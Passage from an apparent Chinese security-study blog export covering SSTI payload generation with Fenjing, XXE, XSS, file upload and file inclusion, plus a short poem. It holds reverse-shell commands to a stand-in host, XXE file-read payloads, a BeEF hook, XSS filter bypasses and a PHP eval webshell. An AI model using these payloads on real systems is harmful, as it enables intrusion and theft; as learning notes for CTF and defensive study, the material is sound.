class="hljs-string">&quot;８&quot;</span>,<span class="hljs-string">&quot;９&quot;</span><br>    ]<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">all</span>(word <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> s <span class="hljs-keyword">for</span> word <span class="hljs-keyword">in</span> blacklist)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    shell_payload, _ = exec_cmd_payload(waf, <span class="hljs-string">&quot;bash -c \&quot;bash -i &gt;&amp; /dev/tcp/example.com/3456 0&gt;&amp;1\&quot;&quot;</span>)<br>    <span class="hljs-comment"># config_payload = config_payload(waf)</span><br><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;shell_payload=&#125;</span>&quot;</span>)<br>    <span class="hljs-comment"># print(f&quot;&#123;config_payload=&#125;&quot;)</span><br></code></pre></td></tr></table></figure><h5 id="在不获取WAF黑名单的情况下，根据返回页面中的特征生成payload"><a href="#在不获取WAF黑名单的情况下，根据返回页面中的特征生成payload" class="headerlink" title="在不获取WAF黑名单的情况下，根据返回页面中的特征生成payload"></a>在不获取WAF黑名单的情况下，根据返回页面中的特征生成payload</h5><p>比如说如果提交的payload被WAF后，WAF页面含有”BAD”这三个字母，那么可以这么写：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> functools<br><span class="hljs-keyword">import</span> time<br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">from</span> fenjing <span class="hljs-keyword">import</span> exec_cmd_payload<br><br><br>URL = <span class="hljs-string">&quot;http://10.137.0.28:5000&quot;</span><br><br><br><span class="hljs-meta">@functools.lru_cache(<span class="hljs-params"><span class="hljs-number">1000</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">waf</span>(<span class="hljs-params">payload: <span class="hljs-built_in">str</span></span>):  <span class="hljs-comment"># 如果字符串s可以通过waf则返回True, 否则返回False</span><br>    time.sleep(<span class="hljs-number">0.02</span>) <span class="hljs-comment"># 防止请求发送过多</span><br>    resp = requests.get(URL, timeout=<span class="hljs-number">10</span>, params=&#123;<span class="hljs-string">&quot;name&quot;</span>: payload&#125;)<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;BAD&quot;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> resp.text<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    shell_payload, will_print = exec_cmd_payload(<br>        waf, <span class="hljs-string">&#x27;bash -c &quot;bash -i &gt;&amp; /dev/tcp/example.com/3456 0&gt;&amp;1&quot;&#x27;</span><br>    )<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> will_print:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;这个payload不会产生回显！&quot;</span>)<br><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;shell_payload=&#125;</span>&quot;</span>)<br></code></pre></td></tr></table></figure><h5 id="让生成器学会使用新的变量"><a href="#让生成器学会使用新的变量" class="headerlink" title="让生成器学会使用新的变量"></a>让生成器学会使用新的变量</h5><p><a href="https://github.com/Marven11/Fenjing/issues/4">参考</a></p><p>比如说你想让生成器学会使用新的变量<code>aaa</code>，它的值是100，需要在payload的前面加上<code>&#123;%set aaa=0x64%&#125;</code>，那你只需要这么写</p><pre><code class="python">from fenjing.full_payload_gen import FullPayloadGenfrom fenjing.const import OS_POPEN_READimport logginglogging.basicConfig(level = logging.INFO)def waf(s: str): # 这个函数因题目而定    blacklist = [        &quot;00&quot;, &quot;1&quot;, &quot;3&quot;, &quot;5&quot;, &quot;7&quot;, &quot;9&quot;    ]    return all(word not in s for word in blacklist)if __name__ == &quot;__main__&quot;:    full_payload_gen = FullPayloadGen(waf)    full_payload_gen.do_prepare()    full_payload_gen.add_context_variable(&quot;&#123;%set aaa=0x64%&#125;&quot;, &#123;&quot;aaa&quot;: 100&#125;)    shell_payload, will_print = full_payload_gen.generate(OS_POPEN_READ, &quot;bash -c \&quot;bash -i &gt;&amp; /dev/tcp/example.com/3456 0&gt;&amp;1\&quot;&quot;)    if not will_print:        print(&quot;这个payload不会产生回显&quot;)    print(f&quot;&#123;shell_payload=&#125;&quot;)</code></pre>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/2024/09/23/%E6%BC%8F%E6%B4%9E-XEE/"/>
    <url>/2024/09/23/%E6%BC%8F%E6%B4%9E-XEE/</url>
    
    <content type="html"><![CDATA[<p><a href="https://xz.aliyun.com/t/3357?time__1311=n4+xnD0DgGYQwqYq40HpDUOODBnbCKe4D">https://xz.aliyun.com/t/3357?time__1311=n4%2BxnD0DgGYQwqYq40HpDUOODBnbCKe4D</a></p><h2 id="XXE注入"><a href="#XXE注入" class="headerlink" title="XXE注入"></a>XXE注入</h2><blockquote><p>XXE注入全称是xml external entity<br>注入，也就是xml外部实体注入。XXE漏洞发生在应用程序解析输入的XML时，没有禁止外部实体的加载，导致可加载恶意外部文件，造成文件读取，命令执行等攻击。</p></blockquote><h3 id="一、XML简介"><a href="#一、XML简介" class="headerlink" title="一、XML简介"></a>一、XML简介</h3><p>XML是一种用户自定义的标记语言，主要用于数据的存储和传输。<br>XML文档结构包括3部分:XML声明、文档类型定义(可选)和文档元素<br><img src="/images/967964-20200218170611565-506025019.png"></p><p>XML文档有自己的一个格式规范。是由DTD（document typedefine)来控制的。例如：</p><pre><code class="hljs">&lt;?xml version=&quot;1.0&quot;?&gt; &lt;!--XML文档定义--&gt;&lt;!DOCTYPE message [ &lt;!--定义该文档为message类型--&gt;&lt;!ELEMENT message(username,password)&lt;!-- 定义message有两个元素--&gt;&lt;!ELEMENT username(#PCDATA)&gt; &lt;!-- 定义username元素为#PCDATA类型 --&gt;&lt;!ELEMENT password(#PCDATA)&gt;]&gt;</code></pre><p>上面的DTD就定义了XML的根元素为message,然后根元素下面有一些子元素，后面的XML就要像如下的方式来书写。</p><pre><code class="hljs">&lt;message&gt;    &lt;username&gt;root&lt;/username&gt;    &lt;password&gt;123&lt;/password&gt;&lt;/message&gt;</code></pre><h3 id="二、XML实体"><a href="#二、XML实体" class="headerlink" title="二、XML实体"></a>二、XML实体</h3><p>上面的&lt;!ELEMENT&gt;中定义的是 <strong>元素</strong> ，也就是定义了对应XML中的标签。还可以在DTD中定义XML实体。XML实体可以看作一个 <strong>变量</strong><br>，到时候可以在XML中通过&amp;符号来引用。</p><p>XML可分为 <strong>外部实体</strong> 和 <strong>内部实体</strong> 。首先来看内部实体：  </p><h4 id="内部实体"><a href="#内部实体" class="headerlink" title="内部实体"></a>内部实体</h4><p><strong>示例 ：</strong></p><pre><code class="hljs">&lt;? xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE message [&lt;!ELEMENT message ANY&gt;&lt;!ENTITY tst &quot;test&quot;&gt;]&gt;</code></pre><p>其中元素定义的ANY说明接受任何元素，同时定义了一个xml实体（&lt;! ENTITY&gt;标签），这样就可以在XML文档中这样来写</p><pre><code class="hljs">&lt;message&gt;&lt;user&gt;&amp;tst;&lt;/user&gt;&lt;/message&gt;</code></pre><h4 id="外部实体"><a href="#外部实体" class="headerlink" title="外部实体"></a>外部实体</h4><p><strong>示例 ：</strong></p><pre><code class="hljs">&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE message [&lt;!ELEMENT foo ANY &gt;&lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot; &gt;]&gt;&lt;message&gt;    &lt;user&gt;&amp;xxe;&lt;/user&gt;&lt;/message&gt;</code></pre><p>这里用 <strong>&amp; 实体名;</strong> 引用实体，在DTD中定义，在XML文档中引用。<br>通过上面的总结我们知道可以将实体分为外部实体和内部实体。但是实际上从另一个角度来开，还可以分为 <strong>通用实体</strong> 和 <strong>参数实体</strong> 。</p><h4 id="通用实体"><a href="#通用实体" class="headerlink" title="通用实体"></a><strong>通用实体</strong></h4><p>用 &amp;实体名; 引用的实体，他在DTD 中定义，在 XML 文档中引用<br><strong>示例 ：</strong></p><pre><code class="hljs">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;!DOCTYPE Profile [&lt;!ENTITY file SYSTEM &quot;file:///etc/passwd&quot;&gt;]&lt;Profile&gt; &lt;msg&gt;&amp;file;&lt;/msg&gt;&lt;/Profile&gt;</code></pre><h4 id="参数实体"><a href="#参数实体" class="headerlink" title="参数实体"></a><strong>参数实体</strong></h4><p>(1)使用 <code>% 实体名</code>( <strong>这里面空格不能少</strong> ) 在 DTD 中定义，并且 <strong>只能在 DTD 中使用<code>%实体名;</code> 引用</strong><br>(2)只有在 DTD 文件中，参数实体的声明才能引用其他实体<br>(3)和通用实体一样，参数实体也可以外部引用<br><strong>示例 ：</strong></p><pre><code class="hljs">&lt;!ENTITY % an-element &quot;&lt;!ELEMENT mytag (subtag)&gt;&quot;&gt; &lt;!ENTITY % remote-dtd SYSTEM &quot;http://somewhere.example.org/remote.dtd&quot;&gt; %an-element; %remote-dtd;</code></pre><h3 id="三、利用方式"><a href="#三、利用方式" class="headerlink" title="三、利用方式"></a>三、利用方式</h3><h4 id="读取本地文件"><a href="#读取本地文件" class="headerlink" title="读取本地文件"></a>读取本地文件</h4><p>构造payload<br>    <code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;     </code><!DOCTYPE Profile [<!ENTITY file SYSTEM "file:///etc/passwd">]<br>    <code>   &lt;Profile&gt;    </code>    <msg>&amp;file;</msg><br>    &#96;   </Profile></p><p>抓包,在payload通过传参给到服务器解析XML文件的API<br>如此便读取到了敏感信息</p><h4 id="扫描内网存活端口"><a href="#扫描内网存活端口" class="headerlink" title="扫描内网存活端口"></a>扫描内网存活端口</h4><p>外部实体也可以支持http file php等协议<br>可以将file实体改成http:127.0.0.1:不同的端口<br><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;     </code><!DOCTYPE Profile [<!ENTITY file SYSTEM "http:127.0.0.1:[在这里加上burp的爆破模块]">]<br>    <code>   &lt;Profile&gt;    </code>    <msg>&amp;file;</msg><br>    &#96;   </Profile></p><h3 id="四、CTF中XEE攻击"><a href="#四、CTF中XEE攻击" class="headerlink" title="四、CTF中XEE攻击"></a>四、CTF中XEE攻击</h3><p>1.题目地址：Jarvis <a href="http://web.jarvisoj.com:32794/">http://web.jarvisoj.com:32794/</a><br>打开链接，输入数据后抓包：<br><img src="/images/20200827215359547.jpg"><br>发现传的是JSON数据，考虑修改一下上传文件类型为XML类型。构造外部实体，实现XXE攻击。将ContentType字段改为:application&#x2F;xml,然后在请求内容中加上如下的payload:</p><pre><code class="hljs">&lt;?xml version=&quot;1.0&quot; ?&gt;&lt;!DOCTYPE message [&lt;!ENTITY shell SYSTEM &quot;file///etc/passwd&quot;&gt;]&gt;&lt;message&gt;&amp;shell;&lt;/message&gt;</code></pre><p><img src="/images/20200827220200446%202.jpg"><br>发现了&#x2F;home&#x2F;ctf路径。改一下file的路径：file:&#x2F;&#x2F;&#x2F;home&#x2F;ctf&#x2F;flag.txt。即可得到flag<br><img src="/images/20200827220356935.jpg"></p><p>2.题目地址：<a href="https://buuoj.cn/challenges">https://buuoj.cn/challenges</a> (Fake XML cookbook)<br><img src="/images/20200827220726654.jpg"><br>抓包后，发现上传的是XML类型的数据<br><img src="/images/2020082722084479.jpg"><br>直接构造XML外部实体，读flag。payload如下：</p><pre><code class="hljs">&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE user[&lt;!ENTITY admin SYSTEM &quot;file:///flag&quot;&gt;]&gt;&lt;user&gt;&lt;username&gt;&amp;admin;&lt;/username&gt;&lt;password&gt;passwd&lt;/password&gt;&lt;/user&gt;</code></pre><p><img src="/images/20200827220942135.jpg"></p><p><strong>参考文章</strong><br><a href="https://xz.aliyun.com/t/3357">https://xz.aliyun.com/t/3357</a><br><a href="https://www.freebuf.com/vuls/175451.html">https://www.freebuf.com/vuls/175451.html</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/2024/09/23/%E6%BC%8F%E6%B4%9E-XSS/"/>
    <url>/2024/09/23/%E6%BC%8F%E6%B4%9E-XSS/</url>
    
    <content type="html"><![CDATA[<h2 id="漏洞-XSS"><a href="#漏洞-XSS" class="headerlink" title="漏洞-XSS"></a>漏洞-XSS</h2><p>Cross-Site Scripting 简称为“CSS”，为避免与前端叠成样式表的缩写”CSS”冲突，故又称XSS。一般XSS可以分为如下几种常见类型：<br>    1.反射性XSS;  &#x3D;&gt; 交互的数据一般不会被存在数据库中,恶意脚本请求中传入,服务器响应中返回,所见即所得,一次性<br>    2.存储型XSS;  &#x3D;&gt; 交互的数据存在数据库中,永久性存储,比如一些留言板,评论<br>    3.DOM型XSS; &#x3D;&gt; 不与后端服务器产生数据交互,是一种通过DOM操作前端数据输出的时候产生的问题</p><p>XSS是一种发生在前端浏览器端的漏洞，所以其危害的对象也是前端用户<br>形成XSS漏洞的主要原因是程序对输入和输出没有做合适的处理，导致“精心构造”的字符输出在前端时被浏览器当作有效代码解析执行从而产生危害。<br>简单来讲就是在浏览器里面输入<code>&lt;script&gt;xxxx&lt;\script&gt;</code>脚本块,被当成js代码执行了</p><h3 id="反射型XSS"><a href="#反射型XSS" class="headerlink" title="反射型XSS"></a>反射型XSS</h3><p><img src="/images/Pasted%20image%2020240224123110.png"><br>如图所示,输入的内容会显示在下面,如果在里面输入<code>&lt;script&gt;alert(1)&lt;/script&gt;</code>,那么就会执行alert(1)<br>假如此时输入框做了输入长度的限制,那么可以在url参数中写,绕过限制</p><h4 id="get类型"><a href="#get类型" class="headerlink" title="get类型"></a>get类型</h4><p>浏览器的输入通过get传递给后端,再由后端传回来显示在浏览器上.<br>这时攻击者C启动beef-xss,先模拟用户登录网站,在输入框输入hook代码<code>&lt;script src=&quot;http://&lt;C的ip&gt;:3000/hook.js&quot;&gt;&lt;/script&gt;</code>,再到beef的webUI界面<a href="http://127.0.0.1:3000/ui/panel%E6%A3%80%E6%9F%A5%E6%98%AF%E5%90%A6%E6%88%90%E5%8A%9F,%E5%A6%82%E6%9E%9C%E6%88%90%E5%8A%9F,%E9%82%A3%E4%B9%88%E5%B0%B1%E6%8A%8A%E6%AD%A4%E6%97%B6%E7%9A%84url(%E6%90%BA%E5%B8%A6%E6%9C%89%E7%94%A8%E6%88%B7%E4%BB%A3%E7%A0%81)%E5%8F%91%E9%80%81%E7%BB%99%E5%8F%97%E5%AE%B3%E8%80%85,%E5%8F%97%E5%AE%B3%E8%80%85%E7%82%B9%E5%87%BB%E8%BF%9E%E6%8E%A5,%E6%B5%8F%E8%A7%88%E5%99%A8%E7%9A%84%E4%BF%A1%E6%81%AF%E5%B0%B1%E8%A2%AB%E5%8A%AB%E6%8C%81%E4%BA%86">http://127.0.0.1:3000/ui/panel检查是否成功,如果成功,那么就把此时的url(携带有用户代码)发送给受害者,受害者点击连接,浏览器的信息就被劫持了</a></p><h4 id="post类型"><a href="#post类型" class="headerlink" title="post类型"></a>post类型</h4><p>浏览器的输入通过post传递给后端,输入的内容不会被显示在url中,此时可以抓包,在参数那里写<code>&lt;script&gt;xxxx&lt;\script&gt;</code>代码</p><h3 id="存储型XSS"><a href="#存储型XSS" class="headerlink" title="存储型XSS"></a>存储型XSS</h3><p>这个就是你存进去之后别人访问到这个页面也会有这个效果</p><h3 id="DOM型XSS"><a href="#DOM型XSS" class="headerlink" title="DOM型XSS"></a>DOM型XSS</h3><p>DOM型XSS不同之处在于DOM型XSS一般和服务器的解析响应没有直接关系，而是在JavaScript脚本动态执行的过程中产生的。<br>例如</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>DOM Based XSS Demo<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">xsstest</span>(<span class="hljs-params"></span>)</span><br><span class="language-javascript">&#123;</span><br><span class="language-javascript">    <span class="hljs-keyword">var</span> str = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&quot;input&quot;</span>).<span class="hljs-property">value</span>;</span><br><span class="language-javascript">    <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&quot;output&quot;</span>).<span class="hljs-property">innerHTML</span> = <span class="hljs-string">&quot;&lt;img src=&#x27;&quot;</span>+str+<span class="hljs-string">&quot;&#x27;&gt;&lt;/img&gt;&quot;</span>;</span><br><span class="language-javascript">&#125;</span><br><span class="language-javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;output&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;input&quot;</span> <span class="hljs-attr">size</span>=<span class="hljs-string">50</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;&quot;</span> /&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;button&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;submit&quot;</span> <span class="hljs-attr">onclick</span>=<span class="hljs-string">&quot;xsstest()&quot;</span> /&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><p>输入 <code>x&#39; onerror=&#39;javascript:alert(/xss/)</code> 即可触发。</p><h2 id="XSS盲打"><a href="#XSS盲打" class="headerlink" title="XSS盲打"></a>XSS盲打</h2><p>xss盲打并不是xss漏洞的一种类型，而是xss漏洞的一个应用场景，主要是针对网站的后台管理员。<br>打开pukachu的xss盲打在输入框累随意输入一些字符点击提交，我们可以发现输入的结果并没有显示在前端，而是直接提交到后端管理员页面。<br> 如果我们输入一段js代码，由于是直接提交到后端管理员页面，用户前端并不会执行。<br> <img src="/images/Pasted%20image%2020240308091004.png"><br><img src="/images/Pasted%20image%2020240308091013.png"><br>我们在输入框输入<code>&lt;script&gt;alert(&#39;6666&#39;)&lt;/script&gt;</code>,然后提交，再点右上角的提示登入pikachuxss盲打的管理员后台；<br>我们会发现弹出了弹窗，说明我们盲打成功；xss盲打其实是一种尝试性的攻击行为，因为攻击者并不知道后台有没有输出或者是过滤；<br>xss盲打本质还是存储型xss漏洞的利用只不是后台输出端由用户变成了网站管理员，但是危害性就更大了。</p><h3 id="XSS绕过"><a href="#XSS绕过" class="headerlink" title="XSS绕过"></a>XSS绕过</h3><p>xss绕过-过滤-转换</p><p>例子：<br>1.前端限制绕过，直接抓包重放，或者修改html前端代码。比如反射型XSS(get)中限制输入20个字符。所以安全措施尽量不要放在前端。<br>2.大小写，比如<code>&lt;SCRIPT&gt;aLeRT(111)&lt;/sCRIpt&gt;</code>。如果过滤措施只对小写做了处理，我们就可以通过大写的输入来绕过他的措施，大写的输入被输出前端时仍然会被正常的执行。<br>3.双写（拼凑），<code>&lt;scri&lt;script&gt;pt&gt;alert(111)&lt;/scri&lt;/script&gt;pt&gt;</code>。会去除敏感标签如<code>&lt;script&gt;</code>但可能只会去除一次<br>4.注释干扰，<code>&lt;scri&lt;!--test--&gt;pt&gt;alert(111)&lt;/sc&lt;!--test--&gt;ript&gt;。在前端输出时注释是不会被执行的</code><br>xss绕过-过滤-编码</p><p>后台过滤了特殊字符，比如<code>&lt;script&gt;</code>标签，但该标签可以被各种编码，后台不一定会过滤，当浏览器对该标签进行识别时，会翻译成正常的标签，从而执行。（ps：使用编码要注意编码在输出点是否会被正常识别和翻译）</p><p>实验演示：</p><p>打开pikachu的xss之过滤，输入<code>&lt;script&gt;alert(1)&lt;/script&gt;</code>点提交</p><p><a href="https://img2020.cnblogs.com/blog/2054866/202007/2054866-20200716162302697-1539471751.png"><img src="https://img2020.cnblogs.com/blog/2054866/202007/2054866-20200716162302697-1539471751.png"></a></p><p>没有弹窗弹出</p><p><a href="https://img2020.cnblogs.com/blog/2054866/202007/2054866-20200716162353375-6208091.png"><img src="https://img2020.cnblogs.com/blog/2054866/202007/2054866-20200716162353375-6208091.png"></a></p><p> 接着我们查看页面源码</p><p><a href="https://img2020.cnblogs.com/blog/2054866/202007/2054866-20200716162613302-1868779407.png"><img src="https://img2020.cnblogs.com/blog/2054866/202007/2054866-20200716162613302-1868779407.png"></a></p><p> 可以看到我们输入的标签都被去掉了，说明后台有对<code>&lt;script&gt;</code>标签进行过滤</p><p>接下来我们使用大小写混合的方法输入<code>&lt;SCrIPT&gt;alert(1)&lt;/ScRiPt&gt;</code></p><p><a href="https://img2020.cnblogs.com/blog/2054866/202007/2054866-20200716162745829-1171243701.png"><img src="https://img2020.cnblogs.com/blog/2054866/202007/2054866-20200716162745829-1171243701.png"></a></p><p> 成功弹窗，说明我们成功绕过了过滤，他的过滤措施并没有对大小写过滤。</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/2024/09/23/%E6%BC%8F%E6%B4%9E-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"/>
    <url>/2024/09/23/%E6%BC%8F%E6%B4%9E-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/</url>
    
    <content type="html"><![CDATA[<p>比如我想要上传一句话木马 1.php<br>&#96;<?php eval($_POST[1];?></p><h3 id="校验在前端"><a href="#校验在前端" class="headerlink" title="校验在前端"></a>校验在前端</h3><p>先上传一个正常的图片并抓包,把POST请求体内容改成一句话木马</p><h3 id="MIME类型"><a href="#MIME类型" class="headerlink" title="MIME类型"></a>MIME类型</h3><p>只支持上传MIME类型的(MIME 消息能包含文本、图像、音频、视频以及其他应用程序专用的数据。)</p><p>绕过方案: 抓包,改变http报文中Content-Type请求头,改成支持的文件格式比如image&#x2F;png<br><img src="/images/Pasted%20image%2020240302205344.png"><br><img src="/images/Pasted%20image%2020240302205356.png"></p><h3 id="真-只能上传图片"><a href="#真-只能上传图片" class="headerlink" title="真-只能上传图片"></a>真-只能上传图片</h3><p>后端使用了getimagesize()函数,它会正儿八经地检验文件格式,所以只能上传文件.</p><p>绕过:<br>准备一个图片和一个一句话木马,使用命令行合并文件<br>cmd执行 <code>copy 上传的图片.png /b + 木马文件.php /a 最终合并的文件名.png</code><br>将最后合并的文件上传<br>然后使用文件包含漏洞,包含这个文件(注意先用..&#x2F;..&#x2F;探测出文件相对于根目录所在位置)</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/2024/09/23/%E6%BC%8F%E6%B4%9E-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"/>
    <url>/2024/09/23/%E6%BC%8F%E6%B4%9E-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/</url>
    
    <content type="html"><![CDATA[<p><a href="https://blog.csdn.net/qq_51763493/article/details/132817660">文件包含漏洞总结_ctf 文件包含漏洞-CSDN博客</a></p><p>文件包含，是一个功能。在各种开发语言中都提供了内置的文件包含函数，其可以使开发人员在一个代码文件中直接包含（引入）另外一个代码文件。 比如 在PHP中，提供了：<br>include(),include_once()<br>require(),require_once()<br>这些文件包含函数，这些函数在代码设计中被经常使用到。  </p><p>比如这是一段真实的代码,相当于是把其他.php的内容插入进去了<br><img src="/images/Pasted%20image%2020240227173309.png"></p><p>大多数情况下，文件包含函数中包含的代码文件是固定的，因此也不会出现安全问题。 但是，有些时候，文件包含的代码文件被写成了一个变量，且这个变量可以由前端用户传进来，这种情况下，如果没有做足够的安全考虑，则可能会引发文件包含漏洞。 攻击着会指定一个“意想不到”的文件让包含函数去执行，从而造成恶意操作。 根据不同的配置环境，文件包含漏洞分为如下两种情况：  </p><p>1.本地文件包含漏洞：<br>仅能够对服务器本地的文件进行包含，由于服务器上的文件并不是攻击者所能够控制的，因此该情况下，攻击着更多的会包含一些 固定的系统配置文件，从而读取系统敏感信息。很多时候本地文件包含漏洞会结合一些特殊的文件上传漏洞，从而形成更大的威力。<br>比如如果服务端 <code>include $_GET[&#39;filename&#39;]</code><br>那么在客户端就可以 ?filename&#x3D;..&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd                   (这里前面加多少个..&#x2F;需要一个个试,因为你不确定当前文件所在的目录)<br>就可以读到&#x2F;etc&#x2F;passwd文件<br>2.远程文件包含漏洞：<br>[需要php的配置php.ini里面allow_url_include这个参数为On]</p><p>能够通过url地址对远程的文件进行包含，这意味着攻击者可以传入任意的代码，这种情况没啥好说的，准备挂彩。<br>因此，在web应用系统的功能设计上尽量不要让前端用户直接传变量给包含函数，如果非要这么做，也一定要做严格的白名单策略进行过滤。<br>你可以通过“File Inclusion”对应的测试栏目，来进一步的了解该漏洞。</p><p>具体: 在另一个网站的服务器的根目录里面</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>绛春城文选 639</title>
    <link href="/2023/06/15/%E7%BB%9B%E6%98%A5%E5%9F%8E%E6%96%87%E9%80%89-639/"/>
    <url>/2023/06/15/%E7%BB%9B%E6%98%A5%E5%9F%8E%E6%96%87%E9%80%89-639/</url>
    
    <content type="html"><![CDATA[<p>棠虾赤.游鄂          v1.0    by FHK_KMD终晨<br>粼粼楚水两汉路，繁华处，几曾都。雪柳裙群芙莺肤，笑语常驻，行客意足。<br>昭君广场屈原墓，千年怨，至今孤。庄王问鼎，辛亥逐鹿。江心星如鼓，街上人踟蹰。<br>                                -&gt;游 楚河汉街 作  </p>]]></content>
    
    
    
  </entry>
  
  
  
  
</search>
